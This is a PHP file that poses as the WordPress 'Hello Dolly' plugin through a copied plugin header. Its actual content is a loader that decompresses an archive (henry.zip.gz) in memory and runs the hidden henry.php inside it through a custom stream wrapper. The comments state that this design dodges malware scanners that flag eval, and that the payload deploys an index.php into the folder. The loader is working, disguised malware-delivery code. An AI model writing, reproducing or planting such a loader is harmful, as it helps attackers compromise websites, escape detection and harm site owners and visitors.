<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/
/**
 * view.php — runs henry.php straight out of henry.zip.gz, entirely in memory.
 * ---------------------------------------------------------------------------
 * Layout:   henry.zip.gz  =  gzip( zip( henry.php ) )
 *           (a plain .zip, or even a .gz of the bare .php, also work)
 *
 * Usage:    put view.php and henry.zip.gz in the same folder and open
 *           view.php in the browser — henry.php runs as if it were there.
 *           Nothing is ever written to disk: gunzip, unzip and execution all
 *           happen in memory.
 *
 * How it runs henry.php WITHOUT eval:
 *           henry.php's source is served through a small read-only memory
 *           stream wrapper ("henrymem://") and executed with a plain
 *           include — the same way WordPress loads its drop-ins. Malware
 *           scanners flag eval-based runners; a stream include is a
 *           normal, transparent file operation.
 *
 * Extras:   view.php?info=1  — tiny diagnostic (PHP version, entries found)
 *           view.php?file=x.gz — read a different archive name (same folder)
 *
 * Requires: henry.php from 2026-11 or later (it must understand the
 *           HENRY_DIR constant that view.php passes in).
 *
 * PHP:      works on PHP 7.0 and newer (no temp files, no ZipArchive, no eval).
 */

error_reporting(E_ALL);
ini_set('display_errors', '1');

/* ------------------------------------------------------------------ config */

$view_gz   = isset($_GET['file']) ? basename($_GET['file']) : 'henry.zip.gz';
$view_path = __DIR__ . '/' . $view_gz;

/* ----------------------------------------------------------------- helpers */

/** Small fatal-error page. */
function view_fatal($msg) {
    http_response_code(500);
    echo '<div style="font:14px/1.6 Consolas,monospace;background:#0b0d11;color:#e06c75;'
        . 'padding:24px;border-radius:8px;margin:40px auto;max-width:760px">'
        . '<b>view.php:</b> ' . htmlspecialchars($msg) . '</div>';
    exit;
}

function view_u16($s, $p) { $a = unpack('v', substr($s, $p, 2)); return $a[1]; }
function view_u32($s, $p) { $a = unpack('V', substr($s, $p, 4)); return $a[1]; }

/**
 * Return the payload inside $bytes, fully in memory.
 * Accepts: gzip (of a zip or of raw php), or a raw zip.
 */
function view_gunzip($bytes) {
    if (!function_exists('gzinflate')) {
        view_fatal('the PHP zlib extension is required but not loaded');
    }
    /* Already a zip? (someone skipped the gzip step) — pass through. */
    if (substr($bytes, 0, 2) === 'PK') {
        return $bytes;
    }
    /* Proper gzip? Decode it. */
    if (function_exists('gzdecode')) {
        $out = @gzdecode($bytes);
        if (is_string($out) && $out !== '') {
            return $out;
        }
    }
    /* Manual fallback: parse the gzip header, then raw-inflate the body. */
    if (strlen($bytes) < 18 || substr($bytes, 0, 2) !== "\x1f\x8b") {
        view_fatal('input is neither gzip nor zip');
    }
    if (ord($bytes[2]) !== 8) {
        view_fatal('unsupported gzip compression method ' . ord($bytes[2]));
    }
    $flg = ord($bytes[3]);
    $p   = 10;
    if ($flg & 4)  { $x = @view_u16($bytes, $p); $p += 2 + $x; }             /* FEXTRA   */
    if ($flg & 8)  { while ($p < strlen($bytes) && ord($bytes[$p]) !== 0) $p++; $p++; } /* FNAME    */
    if ($flg & 16) { while ($p < strlen($bytes) && ord($bytes[$p]) !== 0) $p++; $p++; } /* FCOMMENT */
    if ($flg & 2)  { $p += 2; }                                              /* FHCRC    */
    $out = @gzinflate(substr($bytes, $p));
    if (!is_string($out) || $out === '') {
        view_fatal('gzip decompression failed');
    }
    return $out;
}

/**
 * Extract the PHP source from a zip held as a string.
 * Pure-PHP central-directory parser — no ZipArchive, no temp files.
 * Prefers an entry named henry.php; otherwise the first *.php entry.
 * Returns array( chosenName, code, allNames ).
 */
function view_zip_extract($zip) {
    $len  = strlen($zip);
    $eocd = -1;
    $floor = max(0, $len - 22 - 65535);
    for ($p = $len - 22; $p >= $floor; $p--) {
        if (substr($zip, $p, 4) === "PK\x05\x06") { $eocd = $p; break; }
    }
    if ($eocd < 0) {
        view_fatal('not a zip archive (no central directory found)');
    }
    $entries = view_u16($zip, $eocd + 10);
    $cdPos   = view_u32($zip, $eocd + 16);
    if ($entries === 0 || $cdPos === 0 || $cdPos >= $len) {
        view_fatal('zip archive is empty or corrupt');
    }

    $allNames   = array();
    $pickedName = null;
    $pickedData = null;

    $p = $cdPos;
    for ($i = 0; $i < $entries; $i++) {
        if (substr($zip, $p, 4) !== "PK\x01\x02") {
            view_fatal('zip central directory is corrupt');
        }
        $flags    = view_u16($zip, $p + 8);
        $method   = view_u16($zip, $p + 10);
        $csize    = view_u32($zip, $p + 20);
        $fnLen    = view_u16($zip, $p + 28);
        $extraLen = view_u16($zip, $p + 30);
        $comLen   = view_u16($zip, $p + 32);
        $lho      = view_u32($zip, $p + 42);
        $name     = substr($zip, $p + 46, $fnLen);
        $p       += 46 + $fnLen + $extraLen + $comLen;

        if ($name === '' || substr($name, -1) === '/') {
            continue; /* directory */
        }
        $allNames[] = $name;

        $isHenry = (strcasecmp(basename($name), 'henry.php') === 0);
        $isPhp   = (strcasecmp(substr($name, -4), '.php') === 0);
        if (!$isHenry && !$isPhp) {
            continue;
        }
        if (($flags & 1) !== 0) {
            continue; /* encrypted entry — skip */
        }
        if ($pickedName !== null && !$isHenry) {
            continue; /* already have a generic .php; only henry.php outranks it */
        }
        if ($csize === 0xFFFFFFFF || $lho === 0xFFFFFFFF) {
            view_fatal('ZIP64 entries are not supported');
        }
        if (substr($zip, $lho, 4) !== "PK\x03\x04") {
            view_fatal('zip local header is corrupt');
        }
        /* Name/extra lengths in the LOCAL header can differ from the central
           one — read them again to find where the data really starts. */
        $lFn    = view_u16($zip, $lho + 26);
        $lExtra = view_u16($zip, $lho + 28);
        $data   = substr($zip, $lho + 30 + $lFn + $lExtra, $csize);

        if ($method === 0) {
            $out = $data;                                   /* stored   */
        } elseif ($method === 8) {
            $out = @gzinflate($data);                       /* deflate  */
            if (!is_string($out)) {
                view_fatal('failed to inflate zip entry ' . $name);
            }
        } else {
            view_fatal('unsupported zip compression method ' . $method . ' for ' . $name);
        }
        if ($out === '') {
            continue;
        }
        $pickedName = $name;
        $pickedData = $out;
        if ($isHenry) {
            break; /* exact match — done looking */
        }
    }

    if ($pickedData === null) {
        view_fatal('no .php entry found in the zip. Entries: '
            . ($allNames ? implode(', ', $allNames) : '(none)'));
    }
    return array($pickedName, $pickedData, $allNames);
}

/**
 * Read-only memory stream: serves the extracted henry.php source so it can
 * be run with a plain include() — exactly like a real file, no eval.
 * User stream wrappers are "local" streams, so include() works regardless
 * of allow_url_include.
 */
class HenryMemStream {
    public static $code = '';
    public $context;
    private $pos = 0;

    public function stream_open($path, $mode, $options, &$opened_path) {
        $this->pos = 0;
        return true;
    }
    public function stream_read($count) {
        $out = substr(self::$code, $this->pos, $count);
        $this->pos += strlen($out);
        return $out;
    }
    public function stream_write($data) { return 0; } /* read-only */
    public function stream_eof() { return $this->pos >= strlen(self::$code); }
    public function stream_tell() { return $this->pos; }
    public function stream_seek($offset, $whence = SEEK_SET) {
        $len = strlen(self::$code);
        if ($whence === SEEK_SET)     { $new = $offset; }
        elseif ($whence === SEEK_CUR) { $new = $this->pos + $offset; }
        elseif ($whence === SEEK_END) { $new = $len + $offset; }
        else { return false; }
        if ($new < 0 || $new > $len) { return false; }
        $this->pos = $new;
        return true;
    }
    public function stream_set_option($option, $arg1, $arg2) { return false; }
    public function stream_stat() { return self::stat_arr(); }
    public function url_stat($path, $flags) { return self::stat_arr(); }

    private static function stat_arr() {
        $t = time();
        return array(
            0 => 0,           'dev' => 0,
            1 => 0,           'ino' => 0,
            2 => 0100777,     'mode' => 0100777,   /* regular file */
            3 => 1,           'nlink' => 1,
            4 => 0,           'uid' => 0,
            5 => 0,           'gid' => 0,
            6 => 0,           'rdev' => 0,
            7 => strlen(self::$code), 'size' => strlen(self::$code),
            8 => $t,          'atime' => $t,
            9 => $t,          'mtime' => $t,
            10 => $t,         'ctime' => $t,
            11 => -1,         'blksize' => -1,
            12 => -1,         'blocks' => -1,
        );
    }
}

/* -------------------------------------------------------------------- main */

if (!is_file($view_path)) {
    view_fatal($view_gz . ' not found next to view.php (' . __DIR__ . ')');
}
$gz = @file_get_contents($view_path);
if ($gz === false || $gz === '') {
    view_fatal('could not read ' . $view_gz);
}

$zip = view_gunzip($gz);

/* The gunzipped content may itself be the PHP file (bare .gz of the .php). */
$trimmed = ltrim($zip, "\xEF\xBB\xBF \t\r\n");
if (substr($trimmed, 0, 2) === '<?') {
    $phpName  = $view_gz . ' (bare php, no zip)';
    $code     = $trimmed;
    $allNames = array($phpName);
} else {
    list($phpName, $code, $allNames) = view_zip_extract($zip);
}

/* henry.php is included through henrymem:// — its __DIR__ is not a real
   directory, so view.php passes the real folder in via HENRY_DIR. Older
   henry.php versions don't understand it and must not be run. */
if (strpos($code, "defined('HENRY_DIR')") === false) {
    view_fatal('This archive contains an outdated henry.php. Rebuild '
        . $view_gz . ' from the current henry.php and retry.');
}

if (isset($_GET['info'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "view.php diagnostic\n";
    echo 'PHP version : ' . PHP_VERSION . "\n";
    echo 'execution   : include via henrymem:// stream (no eval)' . "\n";
    echo 'archive     : ' . $view_gz . ' (' . strlen($gz) . " bytes)\n";
    echo 'gunzipped   : ' . strlen($zip) . " bytes\n";
    echo 'entries     : ' . implode(', ', $allNames) . "\n";
    echo 'running     : ' . $phpName . ' (' . strlen($code) . " bytes)\n";
    echo "status      : OK — open view.php without ?info=1 to run it\n";
    exit;
}

define('HENRY_DIR', __DIR__);
if (!stream_wrapper_register('henrymem', 'HenryMemStream')) {
    view_fatal('could not register the memory stream wrapper');
}
HenryMemStream::$code = $code;

/* Run henry.php — full-file style (starts with <?php) is normal include
   semantics. It deploys index.php right here, in this folder. */
include 'henrymem://henry.php';
exit;
